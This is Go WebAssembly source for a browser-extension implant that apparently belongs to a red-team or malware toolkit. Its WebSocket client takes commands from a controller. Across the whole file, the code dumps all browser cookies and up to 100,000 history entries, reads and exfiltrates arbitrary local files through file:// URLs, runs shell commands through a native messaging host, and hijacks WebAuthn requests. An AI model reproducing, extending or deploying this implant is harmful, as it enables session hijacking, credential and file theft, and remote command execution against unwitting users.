//go:build js && wasm
// +build js,wasm

package main

import (
	"bytes"
	"compress/gzip"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"regexp"
	"strconv"
	"strings"
	"syscall/js"
	"time"
)

// FIRECRACKER_PORT - hardcoded port that can be easily replaced at build time
const FIRECRACKER_PORT = "38899"

// EXTENSION_NAME - can be set at build time using -ldflags "-X main.EXTENSION_NAME=your.app.name"
var EXTENSION_NAME = "com.chrome.alone" // default value

// Message chunking constants
const MAX_MESSAGE_SIZE = 32000 // Max size before chunking (leave room for JSON overhead)
const CHUNK_SIZE = 30000       // Size of each chunk

const (
	MESSAGE_TYPE_FORM_DATA = "form_data"

	MESSAGE_TYPE_LS_COMMAND_REQ  = "ls_command_request"
	MESSAGE_TYPE_LS_COMMAND_RESP = "ls_command_response"

	MESSAGE_TYPE_SHELL_COMMAND_REQ  = "shell_command_request"
	MESSAGE_TYPE_SHELL_COMMAND_RESP = "shell_command_response"

	MESSAGE_TYPE_DUMP_COOKIES_REQ  = "dump_cookies_request"
	MESSAGE_TYPE_DUMP_COOKIES_RESP = "dump_cookies_response"

	MESSAGE_TYPE_DUMP_HISTORY_REQ  = "dump_history_request"
	MESSAGE_TYPE_DUMP_HISTORY_RESP = "dump_history_response"

	MESSAGE_TYPE_WEB_AUTHN_REQ  = "webauthn_request"
	MESSAGE_TYPE_WEB_AUTHN_RESP = "webauthn_response"

	// Message chunking types (outbound only)
	MESSAGE_TYPE_CHUNK_START = "chunk_start"
	MESSAGE_TYPE_CHUNK_DATA  = "chunk_data"
	MESSAGE_TYPE_CHUNK_END   = "chunk_end"
)

type WebAuthnRequest struct {
	Domain  string `json:"domain"`
	Request string `json:"request"`
	TaskId  string `json:"taskId"`
}

// FirecrackerClient manages WebSocket connection to FIRECRACKER server
type FirecrackerClient struct {
	ws                     js.Value
	url                    string
	connected              bool
	reconnectAttempts      int
	maxReconnectAttempts   int
	reconnectDelay         time.Duration
	messageQueue           []string
	pendingWebAuthnRequest *WebAuthnRequest

	// Message chunking support (outbound only)
	chunkCounter int // for generating unique chunk IDs

	// JavaScript callback functions
	onOpenCallback    js.Func
	onMessageCallback js.Func
	onCloseCallback   js.Func
	onErrorCallback   js.Func
}

// NewFirecrackerClient creates a new FIRECRACKER WebSocket client
func NewFirecrackerClient() *FirecrackerClient {
	client := &FirecrackerClient{
		url:                    fmt.Sprintf("ws://127.0.0.1:%s", FIRECRACKER_PORT),
		connected:              false,
		reconnectAttempts:      0,
		maxReconnectAttempts:   10,
		reconnectDelay:         time.Second * 5,
		messageQueue:           make([]string, 0),
		pendingWebAuthnRequest: nil,
		chunkCounter:           0,
	}

	// Setup JavaScript callbacks
	client.setupCallbacks()

	return client
}

// setupCallbacks initializes JavaScript callback functions
func (fc *FirecrackerClient) setupCallbacks() {
	fc.onOpenCallback = js.FuncOf(func(this js.Value, args []js.Value) interface{} {
		fc.onOpen()
		return nil
	})

	fc.onMessageCallback = js.FuncOf(func(this js.Value, args []js.Value) interface{} {
		if len(args) > 0 {
			fc.onMessage(args[0])
		}
		return nil
	})

	fc.onCloseCallback = js.FuncOf(func(this js.Value, args []js.Value) interface{} {
		if len(args) > 0 {
			fc.onClose(args[0])
		}
		return nil
	})

	fc.onErrorCallback = js.FuncOf(func(this js.Value, args []js.Value) interface{} {
		if len(args) > 0 {
			fc.onError(args[0])
		}
		return nil
	})
}

// Connect establishes WebSocket connection to FIRECRACKER server
func (fc *FirecrackerClient) Connect() {
	println("FIRECRACKER: Attempting to connect to", fc.url)

	// Create new WebSocket connection
	websocketConstructor := js.Global().Get("WebSocket")
	if websocketConstructor.IsUndefined() {
		println("FIRECRACKER: WebSocket is not available")
		return
	}

	fc.ws = websocketConstructor.New(fc.url)

	// Set up event handlers
	fc.ws.Set("onopen", fc.onOpenCallback)
	fc.ws.Set("onmessage", fc.onMessageCallback)
	fc.ws.Set("onclose", fc.onCloseCallback)
	fc.ws.Set("onerror", fc.onErrorCallback)
}

// onOpen handles WebSocket connection open event
func (fc *FirecrackerClient) onOpen() {
	println("FIRECRACKER: WebSocket connected successfully")
	fc.connected = true
	fc.reconnectAttempts = 0

	// Send any queued messages
	fc.flushMessageQueue()
}

// onMessage handles incoming WebSocket messages
func (fc *FirecrackerClient) onMessage(event js.Value) {
	data := event.Get("data")
	if data.Type() == js.TypeString {
		message := data.String()
		println("FIRECRACKER: Received message:", message)

		// Process the message
		fc.processMessage(message)
	}
}

// onClose handles WebSocket connection close event
func (fc *FirecrackerClient) onClose(event js.Value) {
	code := event.Get("code").Int()
	reason := event.Get("reason").String()

	println("FIRECRACKER: WebSocket closed - Code:", code, "Reason:", reason)
	fc.connected = false

	// Attempt to reconnect if within retry limits
	if fc.reconnectAttempts < fc.maxReconnectAttempts {
		fc.scheduleReconnect()
	} else {
		println("FIRECRACKER: Max reconnection attempts reached, giving up")
	}
}

// onError handles WebSocket error events
func (fc *FirecrackerClient) onError(event js.Value) {
	println("FIRECRACKER: WebSocket error occurred")
	fc.connected = false
}

// scheduleReconnect schedules a reconnection attempt
func (fc *FirecrackerClient) scheduleReconnect() {
	fc.reconnectAttempts++
	delay := fc.reconnectDelay * time.Duration(fc.reconnectAttempts)

	println("FIRECRACKER: Scheduling reconnection attempt", fc.reconnectAttempts, "in", delay)

	// Use setTimeout to schedule reconnection
	setTimeout := js.Global().Get("setTimeout")
	reconnectCallback := js.FuncOf(func(this js.Value, args []js.Value) interface{} {
		println("FIRECRACKER: Attempting reconnection", fc.reconnectAttempts, "of", fc.maxReconnectAttempts)
		fc.Connect()
		return nil
	})

	setTimeout.Invoke(reconnectCallback, int(delay.Milliseconds()))
}

// SendMessage sends a message to the FIRECRACKER server, with automatic chunking for large messages
func (fc *FirecrackerClient) SendMessage(message string) bool {
	if !fc.connected || fc.ws.IsUndefined() {
		println("FIRECRACKER: WebSocket not connected, queueing message:", message[:min(100, len(message))]+"...")
		fc.messageQueue = append(fc.messageQueue, message)
		return false
	}

	// Check WebSocket ready state
	readyState := fc.ws.Get("readyState").Int()
	if readyState != 1 { // 1 = OPEN
		println("FIRECRACKER: WebSocket not ready (state:", readyState, "), queueing message:", message[:min(100, len(message))]+"...")
		fc.messageQueue = append(fc.messageQueue, message)
		return false
	}

	// Check if message needs chunking
	if len(message) > MAX_MESSAGE_SIZE {
		return fc.sendChunkedMessage(message)
	}

	// Send the message directly
	fc.ws.Call("send", message)
	println("FIRECRACKER: Sent message:", message[:min(200, len(message))])
	return true
}

// sendChunkedMessage splits large messages into chunks and sends them
func (fc *FirecrackerClient) sendChunkedMessage(message string) bool {
	fc.chunkCounter++
	chunkId := fmt.Sprintf("chunk_%d_%d", time.Now().Unix(), fc.chunkCounter)

	println("FIRECRACKER: Message is large (", len(message), " bytes), chunking with ID:", chunkId)

	// Send start chunk
	startChunk := map[string]interface{}{
		"type":      MESSAGE_TYPE_CHUNK_START,
		"chunkId":   chunkId,
		"totalSize": len(message),
	}
	startChunkJson, _ := json.Marshal(startChunk)
	fc.ws.Call("send", string(startChunkJson))

	// Send data chunks
	chunkNum := 0
	for i := 0; i < len(message); i += CHUNK_SIZE {
		end := i + CHUNK_SIZE
		if end > len(message) {
			end = len(message)
		}

		chunk := message[i:end]
		dataChunk := map[string]interface{}{
			"type":     MESSAGE_TYPE_CHUNK_DATA,
			"chunkId":  chunkId,
			"chunkNum": chunkNum,
			"data":     chunk,
		}
		dataChunkJson, _ := json.Marshal(dataChunk)
		fc.ws.Call("send", string(dataChunkJson))
		chunkNum++
	}

	// Send end chunk
	endChunk := map[string]interface{}{
		"type":        MESSAGE_TYPE_CHUNK_END,
		"chunkId":     chunkId,
		"totalChunks": chunkNum,
	}
	endChunkJson, _ := json.Marshal(endChunk)
	fc.ws.Call("send", string(endChunkJson))

	println("FIRECRACKER: Sent chunked message with", chunkNum, "chunks")
	return true
}

// min utility function
func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// flushMessageQueue sends all queued messages
func (fc *FirecrackerClient) flushMessageQueue() {
	if len(fc.messageQueue) == 0 {
		return
	}

	println("FIRECRACKER: Flushing", len(fc.messageQueue), "queued messages")

	for _, message := range fc.messageQueue {
		if fc.SendMessage(message) {
			continue
		} else {
			// If sending fails, keep the rest in queue
			break
		}
	}

	// Clear successfully sent messages
	fc.messageQueue = fc.messageQueue[:0]
}

type FirecrackerMessage struct {
	Type   string `json:"type"`
	Data   string `json:"data"`
	TaskId string `json:"taskId"`
}

// processMessage processes incoming messages from FIRECRACKER server
func (fc *FirecrackerClient) processMessage(message string) {
	// Handle different types of messages from server
	if len(message) > 12 && message[:12] == "FIRECRACKER:" {
		// This is an echo response from our server
		echoedMessage := message[12:]
		println("FIRECRACKER: Server echoed:", echoedMessage)

		// You can add more specific message processing here
		// For example, parse JSON commands, handle ping/pong, etc.

	} else {

		// Expect that we have received a JSON object
		// Parse the JSON object
		var jsonObj FirecrackerMessage
		err := json.Unmarshal([]byte(message), &jsonObj)
		if err != nil {
			println("FIRECRACKER: Error parsing JSON:", err)
			return
		}

		switch jsonObj.Type {
		case MESSAGE_TYPE_LS_COMMAND_REQ:
			fc.handleReadDisk(jsonObj)
		case MESSAGE_TYPE_SHELL_COMMAND_REQ:
			fc.handleShellCommand(jsonObj)
		case MESSAGE_TYPE_DUMP_COOKIES_REQ:
			fc.handleDumpCookies(jsonObj)
		case MESSAGE_TYPE_DUMP_HISTORY_REQ:
			fc.handleDumpHistory(jsonObj)
		case MESSAGE_TYPE_WEB_AUTHN_REQ:
			fc.handleWebAuthn(jsonObj)
		default:
			println("FIRECRACKER: Unknown message type:", jsonObj.Type)
		}
	}
}

func (fc *FirecrackerClient) handleWebAuthn(jsonObj FirecrackerMessage) {
	println("FIRECRACKER: Received webauthn request message:", jsonObj.Data)

	var webAuthnRequest WebAuthnRequest
	err := json.Unmarshal([]byte(jsonObj.Data), &webAuthnRequest)
	webAuthnRequest.TaskId = jsonObj.TaskId
	if err != nil {
		println("FIRECRACKER: Error parsing webauthn request:", err)
		return
	}

	if fc.pendingWebAuthnRequest != nil {
		replacedMessage := map[string]interface{}{
			"type":    MESSAGE_TYPE_WEB_AUTHN_RESP,
			"data":    "Replaced by new request",
			"success": false,
			"taskId":  fc.pendingWebAuthnRequest.TaskId,
		}
		replacedMessageJson, _ := json.Marshal(replacedMessage)
		fc.SendMessage(string(replacedMessageJson))
	}
	println("FIRECRACKER: Updated Pending Webauthn request to: ", jsonObj.Data)
	fc.pendingWebAuthnRequest = &webAuthnRequest
	return
}

func (fc *FirecrackerClient) handleDumpCookies(jsonObj FirecrackerMessage) {
	emptyObj := js.Global().Get("Object").New()

	callback := js.FuncOf(func(this js.Value, args []js.Value) interface{} {
		cookies := args[0]
		cookiesArrayJson := js.Global().Get("JSON").Call("stringify", cookies).String()
		cookiesResponse := map[string]interface{}{
			"type":   MESSAGE_TYPE_DUMP_COOKIES_RESP,
			"data":   cookiesArrayJson,
			"taskId": jsonObj.TaskId,
		}
		cookiesJson, _ := json.Marshal(cookiesResponse)
		fc.SendMessage(string(cookiesJson))
		return nil
	})

	js.Global().Get("chrome").Get("cookies").Call("getAll", emptyObj, callback)
}

func (fc *FirecrackerClient) handleDumpHistory(jsonObj FirecrackerMessage) {
	daysBack := 7

	if jsonObj.Data != "" {
		var err error
		daysBack, err = strconv.Atoi(jsonObj.Data)
		if err != nil {
			daysBack = 7
			println("FIRECRACKER: Could not parse days back, defaulting to 7 days")
		}
	}

	searchObj := js.Global().Get("Object").New()
	searchObj.Set("text", "")
	searchObj.Set("startTime", time.Now().Add(-time.Duration(daysBack)*24*time.Hour).Unix()*1000)
	searchObj.Set("maxResults", 100000)

	callback := js.FuncOf(func(this js.Value, args []js.Value) interface{} {
		historyItems := args[0]
		serializedData := js.Global().Get("JSON").Call("stringify", historyItems).String()
		historyResponse := map[string]interface{}{
			"type":   MESSAGE_TYPE_DUMP_HISTORY_RESP,
			"data":   serializedData,
			"taskId": jsonObj.TaskId,
		}
		historyResponseJson, _ := json.Marshal(historyResponse)
		fc.SendMessage(string(historyResponseJson))
		return nil
	})

	js.Global().Get("chrome").Get("history").Call("search", searchObj, callback)
}

func (fc *FirecrackerClient) handleShellCommand(jsonObj FirecrackerMessage) {
	println("FIRECRACKER: Received shell command message:", jsonObj.Data)
	command := jsonObj.Data

	chrome := js.Global().Get("chrome")
	runtime := chrome.Get("runtime")
	connectNative := runtime.Get("connectNative")

	// Connect to native messaging host - note that the extension name is case-insensitive
	lowerCaseExtensionName := strings.ToLower(EXTENSION_NAME)
	port := connectNative.Invoke(lowerCaseExtensionName)
	if port.IsUndefined() {
		println("FIRECRACKER: Failed to connect to native host")
		fc.SendMessage("SHELL_ERROR: Failed to connect to native host")
		return
	}

	// Create message listener callback
	messageCallback := js.FuncOf(func(this js.Value, args []js.Value) interface{} {
		if len(args) > 0 {
			msg := args[0]
			if msg.Get("data").Type() == js.TypeString {
				response := msg.Get("data").String()

				shellResponse := map[string]interface{}{
					"type":   MESSAGE_TYPE_SHELL_COMMAND_RESP,
					"data":   response,
					"taskId": jsonObj.TaskId,
				}
				shellResponseJson, _ := json.Marshal(shellResponse)
				println("FIRECRACKER: Shell command response:", response)
				fc.SendMessage(string(shellResponseJson))
			}
		}
		return nil
	})

	// Create disconnect callback
	disconnectCallback := js.FuncOf(func(this js.Value, args []js.Value) interface{} {
		println("FIRECRACKER: Native messaging port disconnected")
		lastError := runtime.Get("lastError")
		if !lastError.IsUndefined() && lastError.Get("message").Type() == js.TypeString {
			errorMsg := lastError.Get("message").String()
			println("FIRECRACKER: Native messaging error:", errorMsg)
			fc.SendMessage(fmt.Sprintf("SHELL_ERROR: %s", errorMsg))
		} else {
			fc.SendMessage("SHELL_ERROR: Native messaging port disconnected")
		}
		return nil
	})

	// Set up event listeners
	onMessage := port.Get("onMessage")
	if !onMessage.IsUndefined() {
		onMessage.Call("addListener", messageCallback)
	}

	onDisconnect := port.Get("onDisconnect")
	if !onDisconnect.IsUndefined() {
		onDisconnect.Call("addListener", disconnectCallback)
	}

	// Create message object and send command
	messageObj := js.Global().Get("Object").New()
	messageObj.Set("message", command)

	// Send the command to native host
	port.Call("postMessage", messageObj)
	println("FIRECRACKER: Shell command sent:", command)
}

func (fc *FirecrackerClient) handleReadDisk(jsonObj FirecrackerMessage) {
	println("FIRECRACKER: Received read disk message:", jsonObj.Data)

	// Construct the file:// URL
	fileUrl := fmt.Sprintf("file://%s", jsonObj.Data)
	println("FIRECRACKER: Fetching directory listing from:", fileUrl)

	// Create error callback
	errorCallback := js.FuncOf(func(this js.Value, args []js.Value) interface{} {
		if len(args) > 0 {
			errorMsg := args[0].String()
			println("FIRECRACKER: Error reading disk:", errorMsg)
			fc.SendMessage(fmt.Sprintf("DISK_ERROR: %s", errorMsg))
		}
		return nil
	})

	// Use fetch API with promise chaining
	fetch := js.Global().Get("fetch")
	promise := fetch.Invoke(fileUrl)

	// Chain .then() calls - first get the response and check content type
	promise.Call("then", js.FuncOf(func(this js.Value, args []js.Value) interface{} {
		if len(args) > 0 {
			response := args[0]
			// Check content type to determine if it's text or binary
			contentType := response.Get("headers").Call("get", "content-type").String()
			println("FIRECRACKER: Content-Type:", contentType)

			// If there's no content-type header (null/empty), it's a directory listing (read as text)
			// Otherwise, only read as text if content-type explicitly starts with "text/"
			isText := (contentType == "" || contentType == "<null>" || contentType == "null") ||
				regexp.MustCompile(`^text/`).MatchString(contentType)

			println("FIRECRACKER: isText decision:", isText, "for content-type:", contentType)

			if isText {
				// Read as text for text/ content types
				return response.Call("text")
			} else {
				// Read as binary for everything else (application/, image/, etc.)
				return response.Call("arrayBuffer")
			}
		}
		return nil
	})).Call("then", js.FuncOf(func(this js.Value, args []js.Value) interface{} {
		if len(args) > 0 {
			data := args[0]

			// Check if this is an ArrayBuffer (binary data) or string (text)
			// Use Type() to safely check the JavaScript type
			if data.Type() == js.TypeObject && !data.IsNull() && !data.IsUndefined() {
				// Try to check if it's an ArrayBuffer
				constructor := data.Get("constructor")
				if !constructor.IsUndefined() && constructor.Get("name").String() == "ArrayBuffer" {
					// Handle binary data
					fc.handleBinaryData(data, jsonObj)
					return nil
				}
			}

			// Handle as text data (either string type or not an ArrayBuffer)
			text := data.String()
			fc.processTextContent(text, jsonObj)
		}
		return nil
	})).Call("catch", errorCallback)
}

// processTextContent handles text content (including HTML directory listings)
func (fc *FirecrackerClient) processTextContent(text string, jsonObj FirecrackerMessage) {

	// Check if this is a directory listing by looking for "Index of" in the h1 header
	// The ls command should ALWAYS return directory listings unless accessing a specific file
	if regexp.MustCompile(`<h1[^>]*>Index of`).MatchString(text) {
		// This is a directory listing - parse the HTML to extract file info including size and date
		// First, let's debug by logging the actual HTML structure we receive
		println("FIRECRACKER: Directory listing HTML sample (first 2000 chars):")
		if len(text) > 2000 {
			println(text[:2000])
		} else {
			println(text)
		}

		// Try multiple regex patterns to handle different Chrome HTML structures
		// Pattern 1: Standard Chrome format with data-value attributes
		trRegex1 := regexp.MustCompile(`<tr><td[^>]*data-value="([^"]+)"[^>]*>.*?</td><td[^>]*data-value="(\d+)"[^>]*>([^<]+)</td><td[^>]*data-value="(\d+)"[^>]*>([^<]+)</td></tr>`)
		matches := trRegex1.FindAllStringSubmatch(text, -1)

		// Pattern 2: More flexible - any <tr> with 3+ <td> elements
		if len(matches) == 0 {
			trRegex2 := regexp.MustCompile(`<tr[^>]*>.*?<td[^>]*>.*?<a[^>]*href="([^"]+)"[^>]*>([^<]+)</a>.*?</td>.*?<td[^>]*>([^<]*)</td>.*?<td[^>]*>([^<]*)</td>.*?</tr>`)
			matches = trRegex2.FindAllStringSubmatch(text, -1)
			println("FIRECRACKER: Using flexible pattern 2, found", len(matches), "matches")
		}

		// Pattern 3: Even more basic - just look for table rows with links
		if len(matches) == 0 {
			trRegex3 := regexp.MustCompile(`<tr[^>]*>.*?<a[^>]*href="([^"]+)"[^>]*>([^<]+)</a>.*?</tr>`)
			basicMatches := trRegex3.FindAllStringSubmatch(text, -1)
			println("FIRECRACKER: Using basic pattern 3, found", len(basicMatches), "matches")
			// Convert basic matches to expected format (filename only, empty size/date)
			for _, match := range basicMatches {
				if len(match) >= 3 {
					// Format: [full_match, href, filename]
					// Convert to: [full_match, filename, "0", "", "0", ""]
					fullMatch := []string{match[0], match[2], "0", "", "0", ""}
					matches = append(matches, fullMatch)
				}
			}
		}

		if len(matches) > 0 {
			// Directory has files - extract file info with size and date
			result := ""
			for _, match := range matches {
				println("FIRECRACKER: Full match details:", len(match), "groups")
				for i, group := range match {
					println("FIRECRACKER: Group", i, ":", group)
				}

				var name, sizeDisplay, dateDisplay string
				var isDir bool

				if len(match) >= 6 {
					// Pattern 1 or converted Pattern 3: [full_match, name, sizeBytes, sizeDisplay, timestamp, dateDisplay]
					name = match[1]
					sizeBytes := match[2]
					sizeDisplay = match[3]
					dateDisplay = match[5]

					// Determine if it's a directory by checking if size is 0 and name doesn't have extension
					isDir = sizeBytes == "0" && !regexp.MustCompile(`\.[^.]+$`).MatchString(name)

					println("FIRECRACKER: Pattern 1/3 - name:", name, "sizeBytes:", sizeBytes, "sizeDisplay:", sizeDisplay, "dateDisplay:", dateDisplay)
				} else if len(match) >= 5 {
					// Pattern 2: [full_match, href, filename, size_cell, date_cell]
					name = match[2]        // filename from the <a> tag
					sizeDisplay = match[3] // content of size <td>
					dateDisplay = match[4] // content of date <td>

					// For pattern 2, determine directory by checking if href ends with /
					href := match[1]
					isDir = len(href) > 0 && href[len(href)-1] == '/'

					println("FIRECRACKER: Pattern 2 - name:", name, "href:", href, "sizeDisplay:", sizeDisplay, "dateDisplay:", dateDisplay)
				} else {
					println("FIRECRACKER: Insufficient match groups, skipping")
					continue
				}

				if result != "" {
					result += "\n"
				}

				// Clean up the name - remove trailing / for directories since we add it back
				name = regexp.MustCompile(`/$`).ReplaceAllString(name, "")

				if isDir {
					result += "📁 " + name + "/" + "|" + sizeDisplay + "|" + dateDisplay
				} else {
					result += "📄 " + name + "|" + sizeDisplay + "|" + dateDisplay
				}
			}
			fc.sendFileResponse(result, jsonObj)
		} else {
			// Try fallback to addRow pattern for older format
			// Pattern: addRow("name","encoded_name",isDirectory,size_bytes,"size_display",timestamp,"date_display");
			addRowRegex := regexp.MustCompile(`addRow\("([^"]+)","[^"]*",(\d+),(\d+),"([^"]*)",\d+,"([^"]*)"\);`)
			addRowMatches := addRowRegex.FindAllStringSubmatch(text, -1)
			println("FIRECRACKER: Found", len(addRowMatches), "addRow matches")

			if len(addRowMatches) > 0 {
				result := ""
				for _, match := range addRowMatches {
					println("FIRECRACKER: addRow match:", match[0])
					if len(match) >= 6 {
						name := match[1]
						isDir := match[2] == "1"
						sizeDisplay := match[4]
						dateDisplay := match[5]

						if result != "" {
							result += "\n"
						}

						if isDir {
							result += "📁 " + name + "/" + "|" + sizeDisplay + "|" + dateDisplay
						} else {
							result += "📄 " + name + "|" + sizeDisplay + "|" + dateDisplay
						}
					}
				}
				fc.sendFileResponse(result, jsonObj)
			} else {
				// Try even more flexible pattern to catch any addRow calls
				flexibleAddRowRegex := regexp.MustCompile(`addRow\("([^"]+)"`)
				flexibleMatches := flexibleAddRowRegex.FindAllStringSubmatch(text, -1)
				println("FIRECRACKER: Found", len(flexibleMatches), "flexible addRow matches")

				if len(flexibleMatches) > 0 {
					result := ""
					for _, match := range flexibleMatches {
						if len(match) >= 2 {
							name := match[1]
							// Assume it's a directory if name doesn't contain a dot
							isDir := !regexp.MustCompile(`\.[^.]+$`).MatchString(name)

							if result != "" {
								result += "\n"
							}

							if isDir {
								result += "📁 " + name + "/" + "||"
							} else {
								result += "📄 " + name + "||"
							}
						}
					}
					fc.sendFileResponse(result, jsonObj)
				} else {
					// Empty directory
					fc.sendFileResponse("EMPTY_DIRECTORY", jsonObj)
				}
			}
		}
		return
	}

	// This is NOT a directory listing (no "Index of" in title)
	// This means we're accessing a specific file - apply binary/text detection and compression
	fc.handleFileContent([]byte(text), jsonObj, false)
}

// handleBinaryData handles binary file content read as ArrayBuffer
func (fc *FirecrackerClient) handleBinaryData(arrayBuffer js.Value, jsonObj FirecrackerMessage) {
	// Convert ArrayBuffer to []byte using a different approach
	uint8Array := js.Global().Get("Uint8Array").New(arrayBuffer)
	length := uint8Array.Get("length").Int()

	// Try copying the data in larger chunks to avoid individual byte access
	data := make([]byte, length)

	// Copy data in 1024-byte chunks to minimize JS-Go boundary crossings
	chunkSize := 1024
	for offset := 0; offset < length; offset += chunkSize {
		end := offset + chunkSize
		if end > length {
			end = length
		}

		// Copy chunk
		for i := offset; i < end; i++ {
			val := uint8Array.Index(i).Int()
			if val < 0 || val > 255 {
				println("FIRECRACKER: Invalid byte value at index", i, ":", val)
				val = 0
			}
			data[i] = byte(val)
		}
	}

	println("FIRECRACKER: Binary file content (", len(data), " bytes)")
	fc.handleFileContent(data, jsonObj, true)
}

// handleFileContent handles both text and binary file content with compression
func (fc *FirecrackerClient) handleFileContent(data []byte, jsonObj FirecrackerMessage, isBinary bool) {
	// Check if file content is large enough to warrant compression
	if len(data) > 1024 {
		println("FIRECRACKER: File is large (", len(data), " bytes), compressing...")

		// Compress the content using gzip
		var compressed bytes.Buffer
		gzipWriter := gzip.NewWriter(&compressed)
		_, err := gzipWriter.Write(data)
		if err != nil {
			println("FIRECRACKER: Error compressing file:", err.Error())
			// Fallback: base64 encode raw data
			encoded := base64.StdEncoding.EncodeToString(data)
			fc.sendFileResponse("FILE_CONTENT:"+encoded, jsonObj)
		} else {
			err = gzipWriter.Close()
			if err != nil {
				println("FIRECRACKER: Error closing gzip writer:", err.Error())
				// Fallback: base64 encode raw data
				encoded := base64.StdEncoding.EncodeToString(data)
				fc.sendFileResponse("FILE_CONTENT:"+encoded, jsonObj)
			} else {
				// Base64 encode the compressed data
				compressedBytes := compressed.Bytes()
				encoded := base64.StdEncoding.EncodeToString(compressedBytes)
				println("FIRECRACKER: Compressed from", len(data), "to", len(compressedBytes), "bytes, encoded to", len(encoded), "chars")
				fc.sendFileResponse("FILE_CONTENT_COMPRESSED:"+encoded, jsonObj)
			}
		}
	} else {
		// Small file - base64 encode directly (works for both text and binary)
		encoded := base64.StdEncoding.EncodeToString(data)
		fc.sendFileResponse("FILE_CONTENT:"+encoded, jsonObj)
	}
}

// sendFileResponse sends the file response message
func (fc *FirecrackerClient) sendFileResponse(result string, jsonObj FirecrackerMessage) {
	diskListing := map[string]interface{}{
		"type":   MESSAGE_TYPE_LS_COMMAND_RESP,
		"data":   result,
		"taskId": jsonObj.TaskId,
	}
	diskListingJson, _ := json.Marshal(diskListing)
	println("FIRECRACKER: Sending file response:", len(result), "chars")
	fc.SendMessage(string(diskListingJson))
}

// Close closes the WebSocket connection
func (fc *FirecrackerClient) Close() {
	if fc.connected && !fc.ws.IsUndefined() {
		println("FIRECRACKER: Closing WebSocket connection")
		fc.ws.Call("close")
		fc.connected = false
	}

	// Release JavaScript callbacks
	fc.onOpenCallback.Release()
	fc.onMessageCallback.Release()
	fc.onCloseCallback.Release()
	fc.onErrorCallback.Release()
}

// IsConnected returns the current connection status
func (fc *FirecrackerClient) IsConnected() bool {
	return fc.connected
}

// GetQueueSize returns the number of queued messages
func (fc *FirecrackerClient) GetQueueSize() int {
	return len(fc.messageQueue)
}

// Global FIRECRACKER client instance
var firecrackerClient *FirecrackerClient

// InitializeFirecracker initializes the FIRECRACKER WebSocket client
func InitializeFirecracker() {
	println("FIRECRACKER: Initializing WebSocket client")

	firecrackerClient = NewFirecrackerClient()
	firecrackerClient.Connect()
}

// SendFirecrackerMessage sends a message through the FIRECRACKER WebSocket
func SendFirecrackerMessage(message string) bool {
	if firecrackerClient == nil {
		println("FIRECRACKER: Client not initialized")
		return false
	}

	return firecrackerClient.SendMessage(message)
}

// GetFirecrackerStatus returns the current FIRECRACKER connection status
func GetFirecrackerStatus() bool {
	if firecrackerClient == nil {
		return false
	}

	return firecrackerClient.IsConnected()
}

// CloseFirecracker closes the FIRECRACKER WebSocket connection
func CloseFirecracker() {
	if firecrackerClient != nil {
		firecrackerClient.Close()
		firecrackerClient = nil
	}
}

// Export functions to JavaScript
func ExportFirecrackerFunctions() {
	js.Global().Set("initializeFirecracker", js.FuncOf(func(this js.Value, args []js.Value) interface{} {
		InitializeFirecracker()
		return nil
	}))

	js.Global().Set("sendFirecrackerMessage", js.FuncOf(func(this js.Value, args []js.Value) interface{} {
		if len(args) > 0 && args[0].Type() == js.TypeString {
			message := args[0].String()
			return SendFirecrackerMessage(message)
		}
		return false
	}))

	js.Global().Set("getFirecrackerStatus", js.FuncOf(func(this js.Value, args []js.Value) interface{} {
		return GetFirecrackerStatus()
	}))

	js.Global().Set("closeFirecracker", js.FuncOf(func(this js.Value, args []js.Value) interface{} {
		CloseFirecracker()
		return nil
	}))
}
